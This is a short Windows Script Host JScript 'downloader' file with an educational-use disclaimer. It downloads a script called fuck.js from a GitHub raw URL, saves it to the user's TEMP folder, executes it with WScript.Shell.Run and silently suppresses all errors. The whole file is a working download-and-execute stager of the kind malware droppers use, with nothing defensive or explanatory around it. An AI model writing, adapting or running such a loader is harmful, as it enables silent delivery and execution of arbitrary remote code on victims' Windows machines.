// Name      : JavaScript Downloader 修改版
// This script is distributed for educational purposes only.此脚本仅供学习使用
try {
    var WshShell = WScript.CreateObject("WScript.Shell");
    var filepath = WshShell.ExpandEnvironmentStrings("%TEMP%") + "/fuck.js";
    var url = "https://github.com/xiaozhu2007/FuckWYXBatch/blob/master/Deploy/fuck.js?raw=true"
    var xhr = new ActiveXObject("MSXML2.XMLHTTP")
    xhr.open("GET", url, false)
    xhr.send()
    var fso = new ActiveXObject("Scripting.FileSystemObject")
    if (fso.FileExists(filepath) == false) {
        var file = fso.Createtextfile(filepath, true)
        // 填写
        file.Write(xhr.ResponseBody);
        // 关闭文件
        file.Close();
    }
    var shell = WScript.CreateObject("WScript.Shell")
    shell.Run(filepath)
} catch (e) {/* eat any errors */ }